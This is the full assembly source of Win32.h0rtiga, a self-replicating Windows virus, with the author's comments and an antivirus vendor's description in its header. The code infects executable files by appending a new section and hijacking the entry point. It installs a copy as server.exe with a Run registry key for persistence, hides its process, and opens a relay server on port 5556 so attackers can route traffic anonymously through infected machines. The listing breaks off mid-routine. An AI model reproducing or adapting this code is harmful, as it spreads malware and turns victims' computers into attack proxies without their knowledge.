; Win32.Hortiga
;
; Win32.h0rtiga Coded by |Zan [@deepzone.org]
;
; ©2000 DeepZone - Digital Security Center
;
; http://www.deepzone.org
;
;----------------------------------------------------------------------------
;
; Win32.Hortiga
;
;
; AVP's description
;
; - http://www.avp.ch/avpve/newexe/win32/hortiga.stm)
;
; It is a nonmemory resident parasitic Win32 virus. It searches
; for PE EXE files (Windows executables), then writes itself to
; the end of the file. To reserve a place for its code the virus
; creates a new section with the ".|Zan" name at the end of the
; file.
;
; The virus has "anonymous IP" ability. That means that a hacker
; may use infected machines as a "proxy server" sending packets
; with infected machine's IP address:
;
;         IP1                       IP2                     IP3
;  Hacker's machine  -----<  Infected machine  -----<  Target machine
;
; A hacker connects to the infected machine by using his IP
; address (IP1) and forces the infected machine to forward packets
; to the target machine, then infected machine's IP address (IP2) is
; used. Using this mechanism the hacker hides his IP address.
;
; The virus installs its "anonymous" component as stand-alone program
; using the filename SERVER.EXE. That program is created in the
; Windows system directory and registered in the auto-start registry
; key:
;
; HKLMSoftwareMicrosoftWindowsCurrentVersionRun
;  h0rtiga Server = "Windirserver.exe"
;
; where "Windir" is the Windows system folder.
;
; The virus contains the text string:
;
; (c) 2000. Win9x.h0rtiga v1.0 Server activated - http://mareasvivas.cjb.net
; Coded by |Zan - izan@galaxycorp.com / izan@deepzone.org
; Who are you???
;
; This string is used as ID-text to connect to the hacker's machine
; with the server on the infected machine.
;
; -- end AVP description
;
;
; Win32.h0rtiga by |Zan
;
; h0rtiga is a simple non resident parasite. It wasn't developed
; like a traditional viruse but it finished infecting win32 machines.
;
; Originally it was proof of concept code showing win9x's risks and
; holes in a spanish whitepaper called "Win32.h0rtiga : Anonimato e
; Intrusi?n ".
;
; When extra code was added to patch PE files inoculating h0rtiga code
; in arbitrary files it became a virus ...
;
; h0rtiga infects adding an extra section/object called ".|Zan". It
; can infect under win9x/NT/2k but its payload only play in win9x.
;
; This runtime infector doesn't implement "modern" features like stealth,
; encryptation or polymorphism but if "classic" features like timestamp
; or file attributes.
;
; Infecting with an extra section is "hard" and it had been more
; easy adding viral code to last section but i wanted a clear, fast
; and easy uninfection so i decided the longest, primitive & hard way to
; implement.
;
; h0rtiga payload plays a single server listening on 5556 port. This
; server lets full arbitrary relay and can be handle with a generic
; h0rtiga's client. yes, that's ... now you can imagine black hats
; exploiting infected win9x machines: anonymous surfing, faking e-mails,
; bypassing IRC bans ...
;
; Code contains clear labels and a lot of EQUs and structures documenting
; viral code ...
;
;
; greetings ...
; -------------
;
; spanish sec/hack groups, ADM, beavuh, b0f, non-commercial groups ...
;
; 	... and, of course VLAD & 29A
;
; i'd like to give special thanks to Bumblebee/29A (fantastic VXer).
;
; I hope that h0rtiga can be a good contribution to this fantastic 29A
; release ;)
;
;
; deep greets
; -----------
;
; ^Anuska^<  If you hit one time this key we'll hack this enterprise ...
;	     if you hit two times we'll hack their networks ... sorry
;	     mouse support isn't available ;)
;
; TheWizard< Win ME is the new msoft OS version ... I hope that now it
;	     can handle windows ;)
;
; Nemo< next step ... mmmm ... i don't know ... hack the fix again ?
;
;
; Special greetings ...
; ---------------------
;
; Win32.h0rtiga is dedicated to Sandra ...
;
;


;----------------------------------------------------------------------------
; Win32.h0rtiga - begin virus code (w32h0rtiga.asm)
;----------------------------------------------------------------------------

                ;------------------------------------------------------------
                ;Compiler options
                ;------------------------------------------------------------

                .386P
                locals
                jumps
                .model flat,STDCALL


                ;------------------------------------------------------------
                ;Just to show a message on virus 1st generation
                ;------------------------------------------------------------

		extrn MessageBoxA:PROC
		extrn GetModuleHandleA:PROC
		extrn ExitProcess:PROC


;----------------------------------------------------------------------------
;Data Section
;----------------------------------------------------------------------------

.data

		db 0


;----------------------------------------------------------------------------
;Code Section
;----------------------------------------------------------------------------

.code

	start:

		;------------------------------------------------------------
                ;h0rtiga main
                ;------------------------------------------------------------

                mov	eax, [esp]
     gKerloop:  xor	edx, edx
                dec	eax
                mov	dx,  [eax+3ch]
                test 	dx,  0f800h
                jnz 	gKerloop
                cmp 	eax, [eax+edx+34h]
                jnz 	gKerloop
                call 	gdelta
       gdelta:  pop 	ebp
                sub 	ebp, offset gdelta
                lea 	edi, ebp + kernel
                stosd
                lea 	esi, ebp + sz_mGetProcAddr
                call 	GetAPIExpK32
                lea 	edi, ebp + ddGetProcAddress
                stosd
                lea 	esi, ebp + sz_mLoadLibraryA
                call 	GetAPIExpK32
                lea 	edi, ebp + ddLoadLibraryA
                stosd
                lea 	esi, ebp + sz_mKernel32
                lea 	edi, ebp + addr_apis
                mov 	ebx, NumAPISK32
                call 	MakeTabla
                lea 	esi, ebp + OSVersionInfo.dwOSVersionInfoSize
                push 	SIZEOF_OSVERSIONINFO
                pop 	ecx
                xor 	al, al
        delit:  stosb
                loop 	delit
                lea 	edi, ebp + OSVersionInfo.dwOSVersionInfoSize
                mov 	eax, SIZEOF_OSVERSIONINFO        ; 148
                stosd
                sub 	edi, 4
                push 	edi
                call 	dword ptr [ebp + ddGetVersionExA]
                test 	eax, eax
                jz 	salir
                cmp 	ebp + OSVersionInfo.dwPlatformId, VER_PLATFORM_WIN32_WINDOWS
                jnz 	salir
                call	InsertaServidor
                call 	BuscaHostToInfect
                cmp 	eax, INVALID_HANDLE_VALUE
                jz 	salir
                xchg 	eax, ebx
   InfectaMas:  call 	InfecIt
                call 	ContinuaBusqueda
                test 	eax, eax
                jnz 	InfectaMas
                call 	TerminaBusqueda
        salir:	lea     esi, ebp + OldEntryPointRVA
                lodsd
                xchg    ebx, eax
                push    0
                call    dword ptr [ebp + ddGetModuleHandleA]
                add     eax, ebx
                jmp     eax

		;------------------------------------------------------------
                ;begin h0rtiga data
                ;------------------------------------------------------------

	        FILETIME                        STRUC
        	        FT_dwLowDateTime        DD ?
                	FT_dwHighDateTime       DD ?
        	FILETIME                        ENDS

	        MAX_PATH                        EQU     260

	        WIN32_FIND_DATA                 STRUC
        	        WFD_dwFileAttributes    DD ?
                	WFD_ftCreationTime      FILETIME ?
                	WFD_ftLastAccessTime    FILETIME ?
                	WFD_ftLastWriteTime     FILETIME ?
                	WFD_nFileSizeHigh       DD ?
                	WFD_nFileSizeLow        DD ?
                	WFD_dwReserved0         DD ?
                	WFD_dwReserved1         DD ?
                	WFD_szFileName          DB MAX_PATH DUP (?)
                	WFD_szAlternateFileName DB 13 DUP (?)
                        	                DB 3  DUP (?)
        	WIN32_FIND_DATA                 ENDS

	        SIZEOF_WIN32_FIND_DATA  EQU     SIZE WIN32_FIND_DATA

	        INVALID_HANDLE_VALUE            EQU     -1
        	VER_PLATFORM_WIN32_WINDOWS      EQU      1

	        _OSVERSIONINFO  		STRUCT
	        	dwOSVersionInfoSize     DD ?
        	        dwMajorVersion          DD ?
                	dwMinorVersion          DD ?
                	dwBuildNumber           DD ?
                	dwPlatformId            DD ?
                	szCSDVersion            DB 128 DUP (?)
        	_OSVERSIONINFO  		ENDS

	        SIZEOF_OSVERSIONINFO  	EQU     SIZE _OSVERSIONINFO


	        sz_mGetProcAddr  	db     'GetProcAddress', 0
        	ddGetProcAddress 	dd     ?

        	sz_mLoadLibraryA 	db     'LoadLibraryA', 0
        	ddLoadLibraryA   	dd     ?

	        kernel          	dd ?
        	Counter         	dw ?
        	AddressTableVA  	dd ?
        	OrdinalTableVA  	dd ?

	        NumAPISK32      equ     21
        	sz_mKernel32    db      'KERNEL32', 0
        	TablaK32        db      'ExitProcess', 0
                        	db      'GetVersionExA', 0
                        	db      'FindFirstFileA', 0
                        	db      'FindNextFileA', 0
                        	db      'FindClose', 0
				db	'CreateFileA', 0
				db      'CreateFileMappingA', 0
				db	'MapViewOfFile', 0
                        	db      'UnmapViewOfFile', 0
                        	db      'CloseHandle', 0
				db	'SetFileAttributesA', 0
        			db	'SetFileTime', 0
                        	db      'GetModuleHandleA', 0
                        	db      'GetCommandLineA', 0
                        	db      'GetSystemDirectoryA', 0
                        	db      'ReadFile', 0
                        	db      'WriteFile', 0
                        	db      'SetFilePointer', 0
                        	db      'GetCurrentProcessId', 0
                        	db      'RegisterServiceProcess', 0
                        	db      'GlobalAlloc', 0
        	addr_apis:
        	ddExitProcess            dd      ?
        	ddGetVersionExA          dd      ?
        	ddFindFirstFileA         dd      ?
        	ddFindNextFileA          dd      ?
        	ddFindClose              dd      ?
        	ddCreateFileA            dd      ?
	        ddCreateFileMappingA     dd      ?
        	ddMapViewOfFile          dd      ?
        	ddUnmapViewOfFile        dd      ?
        	ddCloseHandle            dd      ?
        	ddSetFileAttributesA     dd      ?
        	ddSetFileTime            dd      ?
        	ddGetModuleHandleA       dd      ?
        	ddGetCommandLineA        dd      ?
        	ddGetSystemDirectoryA    dd      ?
        	ddReadFile               dd      ?
        	ddWriteFile              dd      ?
        	ddSetFilePointer         dd      ?
        	ddGetCurrentProcessId    dd      ?
        	ddRegisterServiceProcess dd      ?
        	ddGlobalAlloc            dd      ?


	        OSVersionInfo   _OSVERSIONINFO ?

	        _maskExe        db      '*.EXE' , 0

	        MaxInfeccion    equ     6

	        WinFindData     WIN32_FIND_DATA ?

	        hFicActual      dd ?
        	hCMapActual     dd ?

	        newobject:
        	oname           	db      ".|Zan", 0, 0, 0
           	virtualsize          	dd      0
           	RVA                  	dd      0
           	physicalsize         	dd      0
           	physicaloffset       	dd      0
           	reserved             	dd      0, 0, 0
           	objectflags          	dd      0e0000060h

	        SIZEOF_NEWOBJECT  	EQU     28h

        	ObjectTableOffset       dd ?
        	NumObjects              dw ?
        	ObjectAlign             dd ?
        	FileAlign               dd ?
        	ImageSize               dd ?
        	SizeToMap               dd ?
        	OldEntryPointRVA        dd ?

	        hRead           	dd      ?
	        hWrite          	dd      ?
        	bytes_rw        	dd      ?
        	sz_exec         	db      260 dup (?)
        	sz_nserver      	db      'server.exe', 0


	        addr1   		dw 2
        	        		dw 0b415h
                			dd ?
        	addr2   		dw 2
                			dw 0000h
                			db 192,168,0,1
        	sock1   		dd ?
        	sock2   		dd ?
        	gotit   		dd ?
        	buffsz  		equ 4096
        	adrbuff 		dd ?
        	fd_set1 		dd 1,0
        	fd_set2 		dd 1,0
        	fd_set  		struc
        	no      		dd 0
        	sockh   		dd 0
        	fd_set  		ends
        	ttl     		dd 0,64h
        	semaforo 		db 0
        	countbouncer 		db 0

	        msgentryserver db '(c) 2000. Win9x.h0rtiga v1.0 Server activated - http://mareasvivas.cjb.net', 13, 10
        	               db 'Coded by |Zan - izan@galaxycorp.com / izan@deepzone.org', 13, 10, 13, 10
                	       db 'Who are you ???', 13, 10

	        msgentryserverlen equ $-msgentryserver

	        NumAPISW32      equ     10
        	sz_mW32         db      'WSOCK32', 0
        	TablaW32        db      'WSAStartup', 0
                	        db      'socket', 0
                        	db      'bind', 0
                        	db      'listen', 0
                        	db      'accept', 0
                        	db      'connect', 0
                        	db      'send', 0
                        	db      'recv', 0
                        	db      'select', 0
                        	db      'closesocket', 0
        	addr_apis2:
        	ddWSAStartup    dd      ?
        	ddsocket        dd      ?
        	ddbind          dd      ?
        	ddlisten        dd      ?
        	ddaccept        dd      ?
        	ddconnect       dd      ?
        	ddsend          dd      ?
        	ddrecv          dd      ?
	        ddselect        dd      ?
        	ddclosesocket   dd      ?

	        NumAPISAdv32    equ     3
        	sz_mAdv32       db      'ADVAPI32', 0
        	TablaAdv32      db      'RegCreateKeyExA', 0
	                        db      'RegSetValueExA', 0
        	                db      'RegCloseKey', 0
        	addr_apis3:
        	ddRegCreateKeyExA       dd      ?
        	ddRegSetValueExA        dd      ?
        	ddRegCloseKey           dd      ?

		disposition	dd ?
		KeyHandle	dd ?
		clase		db 'Run', 0
		claselen	equ $-clase
		subkey		db 'SoftwareMicrosoftWindowsCurrentVersionRun', 0

        	KeyValuelen     dd ?
        	KeyName         db 'h0rtiga Server', 0

		;------------------------------------------------------------
                ;end h0rtiga data
                ;------------------------------------------------------------

 GetAPIExpK32:  mov     edx, esi
 	  @_1:  cmp     byte ptr [esi], 0
                jz      @_2
                inc     esi
                jmp     @_1
          @_2:  inc     esi
                sub     esi, edx
                mov     ecx, esi
                xor     eax, eax
                mov     word ptr [ebp + Counter], ax
                mov     esi, [ebp + kernel]
                add     esi, 3Ch
                lodsw
                add     eax, [ebp + kernel]
                mov     esi, [eax + 78h]
                add     esi, [ebp + kernel]
                add     esi, 1Ch
                lodsd
                add     eax, [ebp + kernel]
                mov     dword ptr [ebp + AddressTableVA], eax
                lodsd
                add     eax, [ebp + kernel]
                push    eax
                lodsd
                add     eax, [ebp + kernel]
                mov     dword ptr [ebp + OrdinalTableVA], eax
                pop     esi
         @_3:   push    esi
                lodsd
                add     eax, [ebp + kernel]
                mov     esi,eax
                mov     edi,edx
                push    ecx
                cld
                rep     cmpsb
                pop     ecx
                jz      @_4
                pop     esi
                add     esi,4
                inc     word ptr [ebp + Counter]
                jmp     @_3
         @_4:   pop     esi
                movzx   eax, word ptr [ebp + Counter]
                shl     eax,1
                add     eax,dword ptr [ebp + OrdinalTableVA]
                xor     esi,esi
                xchg    eax,esi
                lodsw
                shl     eax,2
                add     eax,dword ptr [ebp + AddressTableVA]
                mov     esi,eax
                lodsd
                add     eax, [ebp + kernel]
                ret
   MakeTabla:	push 	esi
        	call 	dword ptr [ebp + ddLoadLibraryA]
        	push 	ebx
		pop 	ecx
		push 	eax
        	pop 	ebx
	buki: 	lodsb
        	test    al, al
        	jnz     buki
	 MT1:   push 	ecx
		push 	esi
        	push 	ebx
        	call 	dword ptr [ebp + ddGetProcAddress]
		push 	eax
	 MT2:	lodsb
		test al, al
		jnz MT2
		pop eax
		stosd
		pop ecx
		loop MT1
		ret
   BuscaHostToInfect:
	        lea     edi, ebp + Counter
	        xor     ax, ax
        	stosw
	        lea     esi, ebp + WinFindData
        	push    esi
        	lea     esi, ebp + _maskExe
        	push    esi
        	call    dword ptr [ebp + ddFindFirstFileA]
        	ret

     InfecIt:   push    ebx
	        lea     esi, ebp + WinFindData.WFD_szFileName
        	call    EsInfectable
        	cmp     eax, -1
        	jz      II_error
        	call    EliminaAtributosFichero
        	test	eax, eax
		jz	II_error
                lea     esi, ebp + WinFindData.WFD_szFileName
	        push    dword ptr [ebp + SizeToMap]
        	pop     ebx
	        call    Open&Maped_File_RW
        	cmp     eax, -1
        	jz      II_error
	        push    eax
        	pop     ebx
        	add     eax, [ebx + 3ch]
	        push    eax
        	pop     edx
	        lea     edi, ebp + ImageSize
        	mov     eax, dword ptr [edx + 50h]
        	stosd
	        lea     edi, ebp + NumObjects
	        mov     ax, word ptr [edx + 6h]
        	stosw
	        lea     edi, ebp + ObjectAlign
        	mov     eax, dword ptr [edx + 38h]
        	stosd
        	mov     eax, dword ptr [edx + 3ch]
        	stosd
	        xor     eax, eax
        	add     ax, word ptr [edx + 14h]
	        add     eax, 18h
        	add     eax, [ebx + 3ch]
        	add     eax, ebx
	        mov     dword ptr [ebp + ObjectTableOffset], eax
                push    eax
        	pop     esi
        	xor     eax, eax
        	mov     ax, word ptr [ebp + NumObjects]
        	push    SIZEOF_NEWOBJECT
        	pop     ecx
	        xor     edx, edx
        	mul     ecx
        	add     esi, eax
	        inc     word ptr [ebp + NumObjects]
	        push    esi
        	pop     edi
	        mov     eax, [edi - SIZEOF_NEWOBJECT + 8]
	        add     eax, [edi - SIZEOF_NEWOBJECT + 12]
	        mov     ecx, dword ptr [ebp + ObjectAlign]
        	xor     edx, edx
        	div     ecx
        	inc     eax
        	mul     ecx
        	mov     dword ptr [ebp + RVA], eax
                mov     ecx, dword ptr [ebp + FileAlign]
	        push    virlenght
        	pop     eax
        	xor     edx, edx
        	div     ecx
        	inc     eax
        	mul     ecx
        	mov     dword ptr [ebp + physicalsize], eax
	        mov     ecx, dword ptr [ebp + ObjectAlign]
	        push    virlenght
        	pop     eax
        	xor     edx, edx
	        div     ecx
        	inc     eax
        	mul     ecx
        	mov     dword ptr [ebp + virtualsize], eax
		mov     eax, [edi - SIZEOF_NEWOBJECT + 20]
        	add     eax, [edi - SIZEOF_NEWOBJECT + 16]
        	mov     ecx, dword ptr [ebp + FileAlign]
        	xor     edx, edx
        	div     ecx
        	inc     eax
        	mul     ecx
        	mov     dword ptr [ebp + physicaloffset], eax
	        push    virlenght
	        pop     eax
	        add     eax, dword ptr [ebp + ImageSize]
        	mov     ecx, dword ptr [ebp + ObjectAlign]
        	xor     edx, edx
        	div     ecx
        	inc     eax
        	mul     ecx
        	mov     dword ptr [ebp + ImageSize], eax
                lea     esi, ebp + newobject
	        mov     ecx, 10
        	rep     movsd
                lea     esi, ebp + NumObjects
	        mov     edx, [ebx + 3ch]
        	add     edx, ebx
        	lea     edi, [edx + 6h]
        	movsw
	        lea     esi, ebp + ImageSize
        	lea     edi, [edx + 50h]
        	movsd
	        mov     eax, dword ptr [ebp + OldEntryPointRVA]
        	push    eax
	        push    ebx
        	pop     edx
        	add     edx, [ebx + 3ch]
        	mov     eax, dword ptr [edx + 28h]
	        lea     edi, ebp + OldEntryPointRVA
        	stosd
        	mov     eax, dword ptr [ebp + RVA]
        	mov     dword ptr [edx + 28h], eax
        	lea     esi, ebp + start
	        mov     eax, dword ptr [ebp + physicaloffset]
        	add     eax, ebx
        	xchg    eax, edi
        	mov     ecx, virlenght
        	rep     movsb
	        pop     eax
        	mov     dword ptr [ebp + OldEntryPointRVA], eax
                mov     word ptr [edx + 4ch], 0d00dh
        	add     ebp + Counter, 1
	        xchg	eax, ebx
        	call    Close&UnMaped_File_RW
          	call    RestauraAtributosFichero
        	test    eax, eax
		jz	II_error
     II_error:  pop     ebx
		ret

     ContinuaBusqueda:
	        cmp     [ebp + Counter], MaxInfeccion
        	jz      CB_end
        	lea     esi, ebp + WinFindData
        	push    esi
        	push    ebx
        	call    dword ptr [ebp + ddFindNextFileA]
        	ret
       CB_end:  xor     eax, eax
        	ret

     TerminaBusqueda:
	        push    ebx
        	call    dword ptr [ebp + ddFindClose]
        	ret

     Open&Maped_File_RW:
		push    0
        	push    0
        	push    3h
        	push    0
        	push    0
        	push    80000000h or 40000000h
        	push    esi
        	call    dword ptr [ebp + ddCreateFileA]
		cmp	eax, -1
		jz	OMF_error
        	lea     edi, ebp + hFicActual
        	stosd
	        push    0
        	push    ebx
        	push    0
        	push    4h
        	push    0
        	push    eax
	        call    dword ptr [ebp + ddCreateFileMappingA]
		test	eax, eax
		jz 	OMF_error
        	lea     edi, ebp + hCMapActual
        	stosd
	        push    ebx
        	push    0
        	push    0
        	push    2h
	        push    eax
        	call    dword ptr [ebp + ddMapViewOfFile]
		test	eax, eax
		jz	OMF_error
	        ret
   OMF_error:   push 	-1
        	pop 	eax
	        ret

   Close&UnMaped_File_RW:
	        push    eax
	        call    dword ptr [ebp + ddUnmapViewOfFile]
        	test    eax, eax
        	jz      CUF_error
	        lea     esi, ebp + WinFindData.WFD_ftLastWriteTime
        	push    esi
        	lea     esi, ebp + WinFindData.WFD_ftLastAccessTime
        	push    esi
        	lea     esi, ebp + WinFindData.WFD_ftCreationTime
	        push    esi
        	lea     esi, ebp + hFicActual
        	lodsd
        	push    eax
        	call    dword ptr [ebp + ddSetFileTime]
                lea     esi, ebp + hCMapActual
        	lodsd
        	push    eax
        	call    dword ptr [ebp + ddCloseHandle]
	        lea     esi, ebp + hFicActual
        	lodsd
        	push    eax
        	call    dword ptr [ebp + ddCloseHandle]
        	test    eax, eax
        	jz      CUF_error
	        xor     eax, eax
        	ret
   CUF_error:   push -1
         	pop eax
        	ret

   EliminaAtributosFichero:
	        push    80h
		lea     esi, ebp + WinFindData.WFD_szFileName
		push	esi
		call	dword ptr [ebp + ddSetFileAttributesA]
        	ret

   RestauraAtributosFichero:
	        lea	esi, ebp + WinFindData.WFD_dwFileAttributes
		lodsd
		push	eax
		lea     esi, ebp + WinFindData.WFD_szFileName
		push	esi
		call	dword ptr [ebp + ddSetFileAttributesA]
        	ret

   EsInfectable:
		push    0
        	push    0
        	push    3h
        	push    0
        	push    0
        	push    80000000h
	        push    esi
        	call    dword ptr [ebp + ddCreateFileA]
		cmp	eax, -1
        	jz      OMFR_error
        	lea     edi, ebp + hFicActual
        	stosd
	        push    0
        	push    0
        	push    0
        	push    2h
        	push    0
        	push    eax
	        call    dword ptr [ebp + ddCreateFileMappingA]
		test	eax, eax
        	jz      OMFR_error
        	lea     edi, ebp + hCMapActual
        	stosd
	        push    0
        	push    0
        	push    0
        	push    4h
	        push    eax
        	call    dword ptr [ebp + ddMapViewOfFile]
		test	eax, eax
        	jz      OMFR_error
	        push    eax
	        push    eax
        	pop     edx
        	add     eax, [edx + 3ch]
	        cmp     word ptr [edx], 'ZM'
        	jnz     NoInfect
        	cmp     word ptr [eax], 'EP'
	        jnz     NoInfect
        	cmp     word ptr [eax + 4ch], 0d00dh
	        jnz     SiInfect
     NoInfect:  push    -1
        	pop     ebx
        	jmp     SNInfect
     SiInfect:  call    CalculaSizeToMap
     SNInfect:  call    dword ptr [ebp + ddUnmapViewOfFile]
        	test    eax, eax
        	jz      OMFR_error
	        lea     esi, ebp + hCMapActual
        	lodsd
        	push    eax
        	call    dword ptr [ebp + ddCloseHandle]
        	test    eax, eax
        	jz      OMFR_error
	        lea     esi, ebp + hFicActual
        	lodsd
        	push    eax
        	call    dword ptr [ebp + ddCloseHandle]
        	test    eax, eax
        	jz      OMFR_error
	        xchg    ebx, eax
        	ret
   OMFR_error:  push    -1
        	pop     eax
        	ret

   CalculaSizeToMap:
		push    eax
        	pop     ebx
        	xchg    ebx, edx
	        xor     eax, eax
        	mov     ax, word ptr [edx + 6h]
	        mov     word ptr [ebp + NumObjects], ax
	        xor     eax, eax
        	add     ax, word ptr [edx + 14h]
	        add     eax, 18h
	        add     eax, edx
	        mov     dword ptr [ebp + ObjectTableOffset], eax
	        push    eax
        	pop     esi
        	xor     eax, eax
        	mov     ax, word ptr [ebp + NumObjects]
        	push    SIZEOF_NEWOBJECT
	        pop     ecx
        	xor     edx, edx
        	mul     ecx
        	add     esi, eax
	        xor     edx, edx
        	add     edx, [ebx + 3ch]
        	add     edx, ebx
        	lea     edi, ebp + FileAlign
        	mov     eax, dword ptr [edx + 3ch]
        	stosd
                mov     ecx, dword ptr [ebp + FileAlign]
	        push    virlenght
        	pop     eax
        	xor     edx, edx
        	div     ecx
        	inc     eax
        	mul     ecx
        	mov     dword ptr [ebp + physicalsize], eax
	        mov     eax, [esi - SIZEOF_NEWOBJECT + 20]
        	add     eax, [esi - SIZEOF_NEWOBJECT + 16]
        	mov     ecx, dword ptr [ebp + FileAlign]
        	xor     edx, edx
        	div     ecx
	        inc     eax
        	mul     ecx
        	mov     dword ptr [ebp + physicaloffset], eax
	        xchg    ebx, eax
        	lea     esi, ebp + physicalsize
        	lodsd
        	add     ebx, eax
	        mov     dword ptr [ebp + SizeToMap], ebx
	        ret

   InsertaRegistro:
                lea 	esi, ebp + sz_mAdv32
                lea 	edi, ebp + addr_apis3
                mov 	ebx, NumAPISAdv32
                call 	MakeTabla
                lea     esi, ebp + disposition
                push    esi
                add     esi, 4
                push    esi
                push    0
                push    0f003fh
                push    0
                add     esi, 4
                push    esi
                push    0
                add     esi, claselen
                push    esi
                push    80000002h
                call    dword ptr [ebp + ddRegCreateKeyExA]
                test    eax, eax
                jnz     reg_error
                lea     esi, ebp + KeyHandle
                lodsd
                xchg    eax, ebx
                push    dword ptr [ebp + KeyValuelen]
                lea     esi, ebp + sz_exec
                push    esi
                push    1h
                push    0
                lea     esi, ebp + KeyName
                push    esi
                push    ebx
                call    dword ptr [ebp + ddRegSetValueExA]
                test    eax, eax
                jnz     reg_error
                push    ebx
                call    dword ptr [ebp + ddRegCloseKey]
    reg_error:  ret

    InsertaServidor:
                call    dword ptr [ebp + ddGetCommandLineA]
                push    eax
                pop     esi
                lea     edi, ebp + sz_exec
      ot_bmas:  lodsb
                stosb
                test    al, al
                jnz     ot_bmas
                push    0
                push    00000080h
                push    3
                push    0
                push    00000001h
                push    80000000h
                lea     esi, ebp + sz_exec
                push    esi
                call    dword ptr [ebp + ddCreateFileA]
                cmp     eax, -1
                jz      errorEx
                mov     dword ptr [ebp + hRead], eax
                push    260
                lea     ebx, ebp + sz_exec
                push    ebx
                call    dword ptr [ebp + ddGetSystemDirectoryA]
                test    eax, eax
                jz      errorEx
                add     eax, ebx
                xchg    eax, edi
                lea     esi, ebp + sz_nserver
     ot_bmas2:  lodsb
                stosb
                test    al, al
                jnz     ot_bmas2
                mov     dword ptr [ebp + KeyValuelen], 0
                lea     esi, ebp + sz_exec
   calclenstr:  lodsb
                inc     dword ptr [ebp + KeyValuelen]
                test    al, al
                jnz     calclenstr
                call    InsertaRegistro
                push    0
                push    00000080h
                push    1
                push    0
                push    0h
                push    40000000h
                lea     esi, ebp + sz_exec
                push    esi
                call    dword ptr [ebp + ddCreateFileA]
                cmp     eax, -1
                jz      errorEx
                mov     dword ptr [ebp + hWrite], eax
  read_again:   xor     eax, eax
                push    eax
                lea     edi, ebp + bytes_rw
                push    edi
                stosd
                push    260
                lea     esi, ebp + sz_exec
                push    esi
                lea     esi, ebp + hRead
                lodsd
                push    eax
                call    dword ptr [ebp + ddReadFile]
                test    eax, eax
                jz      errorEx
                lea     esi, ebp + bytes_rw
                lodsd
                test    eax, eax
                jz      fdf
                xchg    eax, ebx
                xor     eax, eax
                push    eax
                lea     edi, ebp + bytes_rw
                push    edi
                stosd
                push    ebx
                lea     esi, ebp + sz_exec
                push    esi
                lea     esi, ebp + hWrite
                lodsd
                push    eax
                call    dword ptr [ebp + ddWriteFile]
                test    eax, eax
                jnz     read_again
                jz      errorEx
        fdf:    push    0
                push    0
                push    3ch
                lea     esi, ebp + hRead
                lodsd
                push    eax
                call    dword ptr [ebp + ddSetFilePointer]
                xor     eax, eax
                push    eax
                lea     edi, ebp + bytes_rw
                push    edi
                stosd
                push    4
                lea     esi, ebp + sz_exec
                push    esi
                lea     esi, ebp + hRead
                lodsd
                push    eax
                call    dword ptr [ebp + ddReadFile]
                push    0
                push    0
                lea     esi, ebp + sz_exec
                lodsd
                add     eax, 40
                push    eax
                push    eax
                pop     ebx
                lea     esi, ebp + hRead
                lodsd
                push    eax
                call    dword ptr [ebp + ddSetFilePointer]
                xor     eax, eax
                push    eax
                lea     edi, ebp + bytes_rw
                push    edi
                stosd
                push    4
                lea     esi, ebp + sz_exec
                push    esi
                lea     esi, ebp + hRead
                lodsd
                push    eax
                call    dword ptr [ebp + ddReadFile]
                lea     esi, ebp + sz_exec
                lodsd
                add     eax, offsServer
                push    0
                push    0
                push    ebx
                push    eax
                pop     ebx
                lea     esi, ebp + hWrite
                lodsd
                push    eax
                call    dword ptr [ebp + ddSetFilePointer]
                push    ebx
                pop     eax
                lea     edi, ebp + sz_exec
                stosd
                xor     eax, eax
                push    eax
                lea     edi, ebp + bytes_rw
                push    edi
                stosd
                push    4
                lea     esi, ebp + sz_exec
                push    esi
                lea     esi, ebp + hWrite
                lodsd
                push    eax
                call    dword ptr [ebp + ddWriteFile]
                push    0
                push    0
                push    3ch
                lea     esi, ebp + hRead
                lodsd
                push    eax
                call    dword ptr [ebp + ddSetFilePointer]
                xor     eax, eax
                push    eax
                lea     edi, ebp + bytes_rw
                push    edi
                stosd
                push    4
                lea     esi, ebp + sz_exec
                push    esi
                lea     esi, ebp + hRead
                lodsd
                push    eax
                call    dword ptr [ebp + ddReadFile]
                push    0
                push    0
                lea     esi, ebp + sz_exec
                lodsd
                add     eax, 92
                push    eax
                push    eax
                pop     ebx
                lea     esi, ebp + hRead
                lodsd
                push    eax
                call    dword ptr [ebp + ddSetFilePointer]
                push    0
                push    0
                push    ebx
                push    eax
                pop     ebx
                lea     esi, ebp + hWrite
                lodsd
                push    eax
                call    dword ptr [ebp + ddSetFilePointer]
                push    2
                pop     eax
                lea     edi, ebp + sz_exec
                stosd
                xor     eax, eax
                push    eax
                lea     edi, ebp + bytes_rw
                push    edi
                stosd
                push    2
                lea     esi, ebp + sz_exec
                push    esi
                lea     esi, ebp + hWrite
                lodsd
                push    eax
                call    dword ptr [ebp + ddWriteFile]
                lea     esi, ebp + hRead
                push    esi
                call    dword ptr [ebp + ddCloseHandle]
                test    eax, eax
                jz      errorEx
                lea     esi, ebp + hWrite
                push    esi
                call    dword ptr [ebp + ddCloseHandle]
      errorEx:  ret
        error:  push    0
                call    dword ptr [ebp + ddExitProcess]

	        offsServer equ $-start

       server:	mov 	eax, [esp]
    gKerloop2:  xor 	edx, edx
                dec 	eax
                mov 	dx,  [eax + 3ch]
                test 	dx, 0f800h
                jnz 	gKerloop2
                cmp 	eax, [eax + edx + 34h]
                jnz 	gKerloop2
                call 	gdelta2
      gdelta2:  pop 	ebp
                sub 	ebp, offset gdelta2
                lea 	edi, ebp + kernel
                stosd
                lea 	esi, ebp + sz_mGetProcAddr
                call 	GetAPIExpK32
                lea 	edi, ebp + ddGetProcAddress
                stosd
                lea 	esi, ebp + sz_mLoadLibraryA
                call 	GetAPIExpK32
                lea 	edi, ebp + ddLoadLibraryA
                stosd
                lea 	esi, ebp + sz_mKernel32
                lea 	edi, ebp + addr_apis
                mov 	ebx, NumAPISK32
                call 	MakeTabla
                lea 	esi, ebp + sz_mW32
                lea 	edi, ebp + addr_apis2
                mov 	ebx, NumAPISW32
                call 	MakeTabla
	        call    dword ptr [ebp + ddGetCurrentProcessId]
        	push    1
	        push    eax
	        call    dword ptr [ebp + ddRegisterServiceProcess]
	        push    buffsz
        	push    0
        	call    dword ptr [ebp + ddGlobalAlloc]
	        cmp     eax, -1
        	je      error
        	mov     dword ptr [ebp + adrbuff], eax
	        push    eax
	        push    101h
        	call    dword ptr [ebp + ddWSAStartup]
	        push    6
        	push    1
        	push    2
        	call    dword ptr [ebp + ddsocket]
	        cmp     eax, -1
        	je      error
        	mov     dword ptr [ebp + sock1], eax
	        push    16
